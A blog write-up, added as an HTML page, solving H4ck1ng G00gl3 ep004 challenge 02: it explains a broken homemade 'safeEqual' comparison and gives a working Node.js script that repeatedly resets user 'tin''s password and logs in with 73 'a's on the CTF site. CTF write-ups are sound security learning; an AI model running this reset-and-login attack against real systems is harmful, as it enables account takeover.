@@ -1,0 +1,110 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<title>H4ck1ng G00gl3 ep004 challenge 02 | danielorihuela</title>
+<link rel=stylesheet href=/css/style.css>
+<link rel=stylesheet href=/css/logo.css>
+<link rel=stylesheet href=/css/posts.css>
+</head>
+<body>
+<main class=content>
+<div class=logo>
+<a href=https://danielorihuela.github.io/>
+<img href=https://danielorihuela.github.io/ class="logo-image w3-circle" src=/images/cyberpunk_programmer_reading_a_book.jpg>
+</a>
+<span class=logo-text>daniel orihuela:~$ cat <font color=#2e86c1>H4ck1ng G00gl3 ep004 challenge 02</font>
+</span>
+</div>
+<h2 id=table-of-contents>Table of Contents</h2>
+<ul>
+<li><a href=#introduction>Introduction</a></li>
+<li><a href=#learning-journey>Learning Journey</a></li>
+</ul>
+<h2 id=introduction>Introduction</h2>
+<p><a href=https://h4ck1ng.google/>H4ck1ng G00gl3</a> is a series of security challenges published on <strong>October 2022</strong> where the only way to win is to think like a hacker. In this post, I explain how I solved <strong>ep004 challenge 02</strong>. Category <strong>Web Exploitation</strong>.</p>
+<h2 id=learning-journey>Learning Journey</h2>
+<figure class=centered-image><img src=/images/h4ck1ng00gl3/ep004ch02/intro.png>
+</figure>
+<p>In this challenge, we are given some code. We have to find the vulnerability and login as &ldquo;tin&rdquo;. Let&rsquo;s check the code.</p>
+<figure class=centered-image><img src=/images/h4ck1ng00gl3/ep004ch02/hashed-passwords.png>
+</figure>
+<p>I found two hardcoded users and their hashed passwords in the &ldquo;users.js&rdquo; file. My first idea was to try and bruteforce somehow the password for &ldquo;tin&rdquo;, but to no avail. I also searched for the value in some rainbow tables on the internet, but it didn&rsquo;t work out.</p>
+<p>In that file, I also found a function to reset the password with a comment saying: &ldquo;we don&rsquo;t allow admins to reset passwords&rdquo;. &ldquo;tin&rdquo; is not an admin, and that comment makes me think it has to be an important detail. However, I don&rsquo;t see how this helps me now, so I wrote it down and continued reading the code.</p>
+<figure class=centered-image><img src=/images/h4ck1ng00gl3/ep004ch02/reset-password.png>
+</figure>
+<p>I found another interesting file, &ldquo;safe-equals.js&rdquo;. It&rsquo;s strange because <strong>the developers programmed their own version of constant time string comparison</strong>. Programming your own cryptographic functions is dangerous. For sure, there must be some vulnerability hidden here. At first glance, it seems to be correct. I didn&rsquo;t pay the required attention to the code. I read it fast and thought it was comparing each letter of the string position by position, regardless of the first position where the letters differed.</p>
+<figure class=centered-image><img src=/images/h4ck1ng00gl3/ep004ch02/safe-equal.png width=1000px>
+</figure>
+<p>That made me lose a lot of time double-checking other parts of the code. I went to ask the community. Effectively, the <strong>&ldquo;safeEqual&rdquo; function is vulnerable</strong>. I had to come back and read it again. This time I decided to check line by line and check on the internet the documentation for every function. After that, I understood the problem. It isn&rsquo;t comparing each value stored in each position of the strings passed as input. Instead, <strong>it compares the indices of the first appearance of every number that the loop is iterating</strong>. I&rsquo;m not sure I explained myself there, so let me put it in an example.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#75715e>// Example: call the function with two strings of the same length
+</span><span style=color:#75715e></span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>safeEqual</span>(<span style=color:#e6db74>&#39;abc123&#39;</span>, <span style=color:#e6db74>&#39;a1b2c3&#39;</span>) {
+    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>match</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
+
+    <span style=color:#75715e>// For our input, this condition is not met
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>a</span>.<span style=color:#a6e22e>length</span> <span style=color:#f92672>!==</span> <span style=color:#a6e22e>b</span>.<span style=color:#a6e22e>length</span>) {
+	<span style=color:#75715e>// This is not executed
+</span><span style=color:#75715e></span>	<span style=color:#a6e22e>match</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
+    }
+
+    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>l</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>a</span>.<span style=color:#a6e22e>length</span>; <span style=color:#75715e>// l = 6
+</span><span style=color:#75715e></span>    <span style=color:#75715e>// Iterate from 0 to 5
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>l</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
+      <span style=color:#75715e>// Compare the index of value &#34;i&#34; in both strings.
+</span><span style=color:#75715e></span>      <span style=color:#75715e>// For i = 0 -&gt; a.indexOf(0) === b.indexOf(0) -&gt; -1 === -1 -&gt; true
+</span><span style=color:#75715e></span>      <span style=color:#75715e>// For i = 1 -&gt; a.indexOf(1) === b.indexOf(1) -&gt; 4 === 1 -&gt; false
+</span><span style=color:#75715e></span>      <span style=color:#75715e>// ...
+</span><span style=color:#75715e></span>      <span style=color:#a6e22e>match</span> <span style=color:#f92672>&amp;&amp;=</span> <span style=color:#a6e22e>a</span>.<span style=color:#a6e22e>indexOf</span>(<span style=color:#a6e22e>i</span>) <span style=color:#f92672>===</span> <span style=color:#a6e22e>b</span>.<span style=color:#a6e22e>indexOf</span>(<span style=color:#a6e22e>i</span>);
+    }
+
+
+  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>match</span>;
+}
+
+<span style=color:#a6e22e>safeEqual</span>(<span style=color:#e6db74>&#39;abc123&#39;</span>, <span style=color:#e6db74>&#39;a1b2c3&#39;</span>) <span style=color:#75715e>// returns false
+</span><span style=color:#75715e></span><span style=color:#a6e22e>safeEqual</span>(<span style=color:#e6db74>&#39;abcd&#39;</span>, <span style=color:#e6db74>&#39;qwer&#39;</span>) <span style=color:#75715e>// returns true
+</span><span style=color:#75715e></span><span style=color:#a6e22e>safeEqual</span>(<span style=color:#e6db74>&#39;ab12c&#39;</span>, <span style=color:#e6db74>&#39;qw121&#39;</span>) <span style=color:#75715e>// returns true
+</span></code></pre></div><p>The function checks that the first occurrence of each number in both strings returns the same index. If you think about it, that means that any two strings without numbers will return true. <strong>The trick then is to reset &ldquo;tin&rdquo; password until it creates a hash without numbers. Then, we must log in with a password that produces a hash without numbers.</strong></p>
+<p>First, I searched for a password that produced a hash without numbers. It was simple. I just computed in a for loop the hash value for strings of different lengths with the letter &ldquo;a&rdquo; (e.g., &ldquo;a&rdquo;, &ldquo;aa&rdquo;, &ldquo;aaa&rdquo;). The result was that a <strong>string containing seventy-three &ldquo;a&rdquo; produces a hash without numbers</strong>. That is our password. The second step was creating a script that automatically called the reset password endpoint and then tried to log in with the password we computed.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>requestPromise</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;request-promise&#39;</span>).<span style=color:#a6e22e>defaults</span>({ <span style=color:#a6e22e>jar</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span> });
+
+<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>loginOptions</span> <span style=color:#f92672>=</span> {
+    <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;POST&#39;</span>,
+    <span style=color:#a6e22e>uri</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;https://vrp-website-web.h4ck.ctfcompetition.com/login&#39;</span>,
+    <span style=color:#a6e22e>form</span><span style=color:#f92672>:</span> {
+	<span style=color:#a6e22e>username</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;tin&#39;</span>,
+	<span style=color:#a6e22e>password</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;a&#39;</span>.<span style=color:#a6e22e>repeat</span>(<span style=color:#ae81ff>73</span>)
+    },
+    <span style=color:#a6e22e>followAllRedirects</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>,
+};
+
+<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>resetOptions</span> <span style=color:#f92672>=</span> {
+    <span style=color:#a6e22e>method</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;POST&#39;</span>,
+    <span style=color:#a6e22e>uri</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;https://vrp-website-web.h4ck.ctfcompetition.com/reset-password&#39;</span>,
+    <span style=color:#a6e22e>form</span><span style=color:#f92672>:</span> {
+	<span style=color:#a6e22e>username</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;tin&#39;</span>
+    },
+};
+
+(<span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> () {
+    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>incorrect</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
+    <span style=color:#66d9ef>while</span> (<span style=color:#a6e22e>incorrect</span>) {
+	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>loginResponse</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>requestPromise</span>(<span style=color:#a6e22e>loginOptions</span>);
+	<span style=color:#a6e22e>incorrect</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>/Incorrect/</span>.<span style=color:#a6e22e>test</span>(<span style=color:#a6e22e>loginResponse</span>);
+	<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>i</span>);
+	<span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>;
+
+	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>incorrect</span>) {
+	    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>loginResponse</span>);
+	    <span style=color:#66d9ef>break</span>;
+	}
+
+	<span style=color:#66d9ef>await</span> <span style=color:#a6e22e>requestPromise</span>(<span style=color:#a6e22e>resetOptions</span>);
+    }
+})();
+</code></pre></div><p>Executing the script returns the response with the flag. With that, we completed the challenge.</p>
+<figure class=centered-image><img src=/images/h4ck1ng00gl3/ep004ch02/intro.png>
+</figure>
+</main>
+</body>
+</html>
